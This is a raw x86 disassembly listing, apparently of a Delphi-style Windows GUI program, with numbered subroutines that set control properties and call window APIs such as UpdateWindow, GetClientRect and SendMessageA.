je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_446fb4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_44718c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_4470c4
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_4471e4
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_441a58
sub_447204
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_441a58
sub_447228
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_447234
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_441a58
sub_4472e0
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_447284
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_4473bc
jmp sub_403970
sub_4473c3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4475e2
jmp sub_403970
sub_4475e9
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4476f0
call sub_441828
retn
sub_447b3e
jmp sub_403970
sub_447bd4
mov eax [ r-xdata ]
retn
sub_447d3b
jmp sub_403970
sub_447e4c
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_441a58
sub_448162
jmp sub_403970
sub_4482a4
test [ eax + 0x52 ] 0x4
setne al
retn
sub_448400
jmp sub_403970
sub_448407
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_423cc4
retn
sub_448423
jmp sub_403970
sub_448430
retn
sub_448504
mov [ edx + 0xc ] 0xffffffff
retn
sub_448562
jmp sub_403970
sub_448569
pop ecx
pop ecx
pop ebp
retn
sub_448609
jmp sub_403970
sub_448610
pop ebx
mov esp ebp
pop ebp
retn
sub_44867c
call sub_4445e4
retn
sub_44870f
jmp sub_403970
sub_448716
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_4488f5
jmp sub_403970
sub_4488fc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448b18
jmp sub_403970
sub_448b6c
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_448a58
sub_448cb0
push ebx
mov ebx eax
mov eax ebx
call sub_44d9b8
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_448cc8
push ebx
mov ebx eax
mov eax ebx
call sub_44d9b8
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_448db4
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_44521c
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_448e4f
jmp sub_403970
sub_448e56
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448e79
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_423cc4
retn
sub_448e72
jmp sub_403970
sub_448e79
pop ebx
pop ecx
pop ebp
retn
sub_448e80
retn
sub_448ee8
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_449255
jmp sub_403970
sub_44943c
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_449628
jmp sub_403970
sub_4496d8
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_4496ec
inc [ eax + 0x6c ]
retn
sub_4496f0
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_44af70
sub_449850
call sub_449f50
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_44a1fb
jmp sub_403970
sub_44a202
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a21f
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_44a218
jmp sub_403970
sub_44a21f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a500
jmp sub_403970
sub_44a507
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a524
mov eax [ ebp - 0x4 ]
call sub_423cc4
retn
sub_44a51d
jmp sub_403970
sub_44a524
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a541
mov eax [ ebp - 0x4 ]
call sub_40321c
retn
sub_44a53a
jmp sub_403970
sub_44a541
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44a9f5
jmp sub_403970
sub_44a9fc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ab87
jmp sub_403970
sub_44ab8e
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44ac43
jmp sub_403970
sub_44ac4a
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44ad38
jmp sub_403970
sub_44ad89
jmp sub_403970
sub_44ad90
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ae4c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44975c
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_44af98
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_449298
sub_44b898
jmp sub_403970
sub_44b89f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44b968
call GetCapture
retn
sub_44b970
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40ceec
pop ebx
retn
sub_44b980
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_44bbe6
jmp sub_403970
sub_44bde0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_44bff4
jmp sub_403970
sub_44bffb
pop ebx
mov esp ebp
pop ebp
retn
sub_44c046
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_44c0c3
jmp sub_403970
sub_44c0ca
pop ebp
retn
sub_44c152
jmp sub_403970
sub_44c159
pop ebp
retn
sub_44c169
rol [ eax + eax + 0x34 ] 0xc2
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
retn 0x44
sub_44c395
int3
sub_44c396
inc esp
add al ah

sub_44c472
inc esp
add al ah

sub_44c8a8
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_41a1f8
retn
sub_44c8c0
mov al 0x1
retn
sub_44c8c4
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_41ff6c
retn
mov eax edx
retn
sub_44c8d4
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_41ff3c
retn
mov al 0x1
retn
sub_44cbc4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_41a19c
pop esi
pop ebx
retn
sub_44cbd8
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44cc14
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44ce78
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033a8
pop ebx
retn
sub_44ce8c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033a8
pop ebx
retn
sub_44cea0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033a8
pop ebx
retn
sub_44ceb4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033a8
pop ebx
retn
sub_44cec8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033a8
pop ebx
retn
sub_44cedc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033a8
pop ebx
retn
sub_44cef0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033a8
pop ebx
retn
sub_44cf04
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033a8
pop ebx
retn
sub_44cf18
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033a8
pop ebx
retn
sub_44cf2c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033a8
pop ebx
retn
sub_44cf40
retn
sub_44cf44
retn
sub_44cf48
retn
sub_44cf4c
retn
sub_44cf50
retn
sub_44cf54
retn
sub_44cf58
retn
sub_44cf5c
retn
sub_44cf60
retn
sub_44cf64
retn
sub_44cf68
retn
sub_44cf6c
retn
sub_44d218
jmp sub_403970
sub_44d5b4
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ ebx + 0x90 ] eax
sub_44d5dc
push esi
mov si 0xffef
call sub_403418
pop esi
retn
sub_44d67d
jmp sub_403970
sub_44d684
pop ebp
retn
sub_44d688
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419a24
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419a24
sub_44d828
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_44d9ad
jmp sub_403970
sub_44d9b4
pop ebx
pop ecx
pop ebp
retn
sub_44d9b8
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_44d9c0
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_44db90
sub_44da6d
jmp sub_403970
sub_44da74
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_40321c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_44dc23
jmp sub_403970
sub_44dc2a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44dcc2
jmp sub_403970
sub_44dcc9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dce6
mov eax [ ebp - 0xc ]
call sub_40321c
retn
sub_44dcdf
jmp sub_403970
sub_44dce6
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403418
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44dd9f
jmp sub_403970
sub_44dda6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ddac
or edx 0xffffffff
call sub_44dd20
retn
sub_44e1bb
jmp sub_403970
sub_44e1c2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e1df
mov eax [ ebp - 0xc ]
call sub_40321c
retn
sub_44e1d8
jmp sub_403970
sub_44e1df
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e1fc
mov eax [ ebp - 0x4 ]
call sub_44ecf4
retn
sub_44e1f5
jmp sub_403970
sub_44e1fc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e400
jmp sub_403970
sub_44e407
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e40c
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403418
sub_44e424
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_418d40
pop ebx
retn
sub_44e4c8
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_41a040
sub_44e5df
jmp sub_403970
sub_44e5e6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40321c
retn
sub_44e5fc
jmp sub_403970
sub_44e90e
jmp sub_403970
sub_44e915
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e932
mov eax [ ebp - 0x10 ]
call sub_40321c
retn
sub_44e92b
jmp sub_403970
sub_44e932
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e94f
mov eax [ ebp - 0x8 ]
call sub_40321c
retn
sub_44e948
jmp sub_403970
sub_44e94f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e9b8
jmp sub_403970
sub_44ead1
jmp sub_403970
sub_44eaee
jmp sub_403970
sub_44eca6
jmp sub_403970
sub_44ecad
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ecf0
inc [ eax + 0x5c ]
retn
sub_44ecf4
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403418
sub_44ed48
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_44ed85
jmp sub_403970
sub_44ed8c
pop ebp
retn
sub_44ed90
sub [ rw-data ] 0x1
retn
sub_44fc9b
jmp [ eax + eax ]
sub_44fcf8
mov eax [ esp + 0x8 ]
retn
sub_44fd00
push ebx
mov ebx eax
call sub_44fcf8
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
jmp sub_4039a8
sub_44fd1c
pop ebx
retn
sub_44ff95
jmp sub_403970
sub_44ff9c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4500e7
jmp sub_403970
sub_4500ee
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_450104
push ebx
mov eax [ rw-data ]
call sub_41a69c
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_41a670
mov eax ebx
pop ebx
retn
sub_45028c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033cc
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_4502a8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033cc
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_4509a3
jmp sub_403970
sub_4509aa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_450aa2
jmp sub_403970
sub_450aa9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_450ecc
jmp sub_403970
sub_450ed3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_45137f
jmp sub_403970
sub_451820
jmp sub_403970
sub_451827
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_451c8b
jmp sub_403970
sub_452148
jmp sub_403970
sub_45214f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4524fa
jmp sub_403970
sub_452501
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45250f
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4526bc
mov eax [ r-xdata ]
retn
sub_4526f8
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45270c
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45271c
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45272c
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_452a28
mov edx eax
sub_4527c4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033cc
mov edx esi
call sub_452744
pop esi
pop ebx
retn
sub_452840
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_452a28
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_41a1f8
mov ecx eax
sub_452c18
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_452c80
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_453028
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_45305c
sub_45305c
mov edx sub_453034
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_450184
retn
sub_453246
jmp sub_403970
sub_45324d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4536e4
jmp sub_403970
sub_453723
jmp sub_403970
sub_45372a
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4538c8
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_453a04
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403418
pop esi
pop ebp
retn 0x8
sub_453a20
mov eax [ eax + 0x34 ]
call sub_450c58
retn
sub_453a2c
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403418
pop esi
retn
sub_453a68
push ebx
mov ecx sub_453a40
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_450184
pop ebx
retn
sub_453c9c
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_453cb0
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_453de5
jmp sub_4036bc
sub_453ee7
jmp sub_403970
sub_453f12
jmp sub_403970
sub_453f19
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_453f30
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_454118
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_453a68
sub_454198
jmp sub_403970
sub_4541dc
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4541f4
push ebx
mov ebx eax
mov eax ebx
call sub_41ff8c
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_454246
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_453a68
sub_4542bc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_454405
jmp sub_403970
sub_45440c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45464c
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_45465c
sub_4546b0
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_4546c0
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_4546d0
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_4546e0
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_4546f0
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_454768
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_450ab0
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_450ab0
retn
sub_454784
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_450ab0
sub_4547cc
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_453a20
retn
mov eax edx
retn
sub_454878
mov [ eax + 0x58 ] edx
call sub_4547a0
retn
sub_4548ae
jmp sub_4036bc
sub_4548b3
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_460524
call sub_403a24
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454c19
jmp sub_403970
sub_454c20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_40321c
retn
sub_454c36
jmp sub_403970
sub_454d37
jmp sub_403970
sub_454d3e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454d5b
mov eax [ ebp - 0x14 ]
call sub_40321c
retn
sub_454d54
jmp sub_403970
sub_454d79
jmp sub_403970
sub_454e03
jmp sub_403970
sub_454e0a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454e3c
push ebx
mov ebx eax
mov eax ebx
call sub_41a2e0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_420d3c
sub_454f00
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_454f14
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_454f1c
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_4552e1
jmp sub_403970
sub_4552e8
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4553e8
jmp sub_403970
sub_4553ef
pop ebp
retn
sub_455f67
[ edi + edi * 8 - 0x2f002f ]
sub_455f6e
stc
jmp esp
sub_457230
mov eax [ rw-data ]
retn
sub_457238
mov [ rw-data ] eax
retn
sub_457380
jmp sub_4036bc
sub_4573b7
jmp sub_403970
sub_4573be
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4576c6
jmp sub_403970
sub_4576cd
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_457771
jmp sub_403970
sub_457778
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457808
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_457f34
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4585e0
sub_457f50
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_457f34
sub_458070
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4585e0
sub_458088
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_4585e0
sub_4580a0
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_4585e0
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_4580cc
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_4580d8
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_4585e0
retn
sub_4583b8
push ebx
mov ebx edx
mov edx ebx
call sub_443f18
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_458428
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_458550
jmp sub_403970
sub_458557
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458560
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_45796c
mov eax [ ebx + 0x20c ]
call sub_45796c
sub_4585c0
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4585d0
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4586cb
jmp sub_403970
sub_4586d8
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_4586f0
sub_45890c
retn
sub_45897a
jmp sub_403970
sub_4589b9
jmp sub_403970
sub_4589ec
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_445410
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_457bf8
retn
sub_458a10
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_445430
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_457bf8
retn
sub_458b05
jmp sub_403970
sub_458b0c
mov eax [ ebp - 0x4 ]
call sub_4473c8
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_457860
mov eax [ ebp - 0x4 ]
call sub_4585e0
sub_458c40
jmp sub_403970
sub_458c78
jmp sub_403970
sub_458c7f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458c9f
lea eax [ ebp - 0x114 ]
call sub_403f6c
retn
sub_458c98
jmp sub_403970
sub_458c9f
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_458fa6
jmp sub_403970
sub_458fad
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403590
sub_459001
jmp sub_4036bc
sub_45907d
jmp sub_4036bc
sub_459082
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_460524
call sub_403a24
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45943a
jmp sub_403970
sub_459441
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45951c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41df1c
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_459534
push ebx
push esi
